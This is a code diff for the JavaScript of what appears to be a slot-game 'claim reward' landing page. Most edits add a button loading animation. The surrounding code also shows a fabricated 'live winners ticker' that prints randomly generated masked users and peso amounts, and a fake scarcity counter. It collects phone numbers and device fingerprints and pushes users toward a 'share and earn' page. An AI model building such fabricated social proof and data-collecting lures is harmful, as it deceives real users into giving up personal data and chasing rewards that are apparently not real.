@@ -26,7 +26,6 @@ const swipeFireTrail = document.getElementById('swipeFireTrail');
 
 // Scarcity counter
 let count = 88;
-let currentTickerText = "";
 
 // ========== SWIPE WITH FIRE TRAIL ==========
 let isDragging = false;
@@ -71,7 +70,6 @@ function initSwipe() {
     const iconWidth = 56;
     const maxLeft = trackWidth - iconWidth;
     
-    // Touch events for mobile
     swipeIcon.addEventListener('touchstart', (e) => {
         if (swipeCompleted) return;
         e.preventDefault();
@@ -109,7 +107,6 @@ function initSwipe() {
         }
     });
     
-    // Mouse events for desktop
     swipeIcon.addEventListener('mousedown', (e) => {
         if (swipeCompleted) return;
         e.preventDefault();
@@ -151,27 +148,23 @@ async function completeSwipe() {
     if (swipeCompleted) return;
     swipeCompleted = true;
     
-    // Full blaze effect
     if (swipeFireTrail) {
         swipeFireTrail.style.width = '100%';
         swipeFireTrail.classList.add('active');
     }
     
-    // Play sound
     try {
         const audio = new Audio('sounds/super_ace_scatter_ring.mp3');
         audio.volume = 0.7;
         audio.play().catch(e => console.log('Sound error:', e));
     } catch(e) {}
     
-    // Hide swipe container with fade
     const swipeContainer = document.querySelector('.swipe-container');
     if (swipeContainer) {
         swipeContainer.style.transition = 'opacity 0.3s ease';
         swipeContainer.style.opacity = '0';
     }
     
-    // Show modal after short delay
     setTimeout(() => {
         modalOverlay.style.display = 'flex';
         if (swipeContainer) swipeContainer.style.display = 'none';
@@ -182,7 +175,7 @@ async function completeSwipe() {
     }, 500);
 }
 
-// ========== LIVE WINNERS TICKER WITH TRANSITION ==========
+// ========== LIVE WINNERS TICKER ==========
 function updateTickerWithTransition(newText) {
     if (!winnerEntry) return;
     
@@ -207,7 +200,6 @@ function startTicker() {
         return `${randomPrefix}***${randomSuffix} completed task +₱${amount}`;
     }
     
-    // Initial text
     winnerEntry.innerHTML = generateWinner();
     winnerEntry.classList.add('fade-in');
     
@@ -373,21 +365,23 @@ function showBlockedUI(reason = "banned") {
     }
 
     document.getElementById('modalBodyContent').innerHTML = `
-        <div class="bonus-box">
-            <div class="bonus-amount">🚫</div>
+        <div class="bonus-box-premium">
+            <div class="bonus-amount-premium">🚫</div>
         </div>
         <h3 style="color: #FF4444; text-align: center; margin-bottom: 10px;">${title}</h3>
         <p style="font-size: 13px; color: #94a3b8; text-align: center; margin-bottom: 20px;">${blockMessage}</p>
-        <button class="claim-btn" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
+        <button class="login-btn" onclick="location.reload()" style="background: #334155; color: white;">OK</button>
     `;
     if (mainCard) mainCard.style.opacity = "0.3";
 }
 
-// ========== PROCESS STEP 1 ==========
+// ========== PROCESS STEP 1 WITH LOGIN ANIMATION ==========
 window.processStep1 = async function() {
     const phone = userPhoneInput.value.trim();
     const btn = claimBtn;
     const fingerprint = getDeviceFingerprint();
+    const loginTextSpan = btn.querySelector('.login-text');
+    const loginDotsSpan = btn.querySelector('.login-dots');
 
     if (phone.length < 10 || !phone.match(/^\d+$/)) {
         alert("Enter valid mobile number.");
@@ -396,23 +390,39 @@ window.processStep1 = async function() {
     
     const fullPhone = "09" + phone;
     
+    // Start loading animation
+    btn.classList.add('loading');
     btn.disabled = true;
-    btn.innerHTML = "VERIFYING...";
+    
+    // Animate dots manually
+    let dotCount = 0;
+    const dotInterval = setInterval(() => {
+        if (!btn.classList.contains('loading')) {
+            clearInterval(dotInterval);
+            return;
+        }
+        dotCount = (dotCount + 1) % 4;
+        let dots = '';
+        for (let i = 0; i < dotCount; i++) dots += '.';
+        if (loginDotsSpan) loginDotsSpan.textContent = dots;
+    }, 400);
 
     try {
         const banDetails = await getBanDetails(fullPhone, fingerprint);
         if (banDetails.isBanned) {
-            showBlockedUI("banned");
+            clearInterval(dotInterval);
+            btn.classList.remove('loading');
             btn.disabled = false;
-            btn.innerHTML = "CLAIM REWARD";
+            showBlockedUI("banned");
             return;
         }
         
         const isClaimed = await isNumberClaimed(fullPhone);
         if (isClaimed) {
-            showBlockedUI("claimed");
+            clearInterval(dotInterval);
+            btn.classList.remove('loading');
             btn.disabled = false;
-            btn.innerHTML = "CLAIM REWARD";
+            showBlockedUI("claimed");
             return;
         }
         
@@ -427,7 +437,13 @@ window.processStep1 = async function() {
         localStorage.setItem("userPhone", fullPhone);
         localStorage.setItem("userDeviceId", fingerprint);
         localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
-        btn.innerHTML = "SUCCESS!";
+        
+        // Success animation
+        clearInterval(dotInterval);
+        btn.classList.remove('loading');
+        btn.classList.add('success');
+        if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS';
+        if (loginDotsSpan) loginDotsSpan.textContent = '';
         
         setTimeout(() => {
             window.location.href = "share_and_earn.html";
@@ -435,9 +451,10 @@ window.processStep1 = async function() {
         
     } catch (error) {
         console.error("Process error:", error);
-        alert("An error occurred. Please try again.");
+        clearInterval(dotInterval);
+        btn.classList.remove('loading');
         btn.disabled = false;
-        btn.innerHTML = "CLAIM REWARD";
+        alert("An error occurred. Please try again.");
     }
 };
 
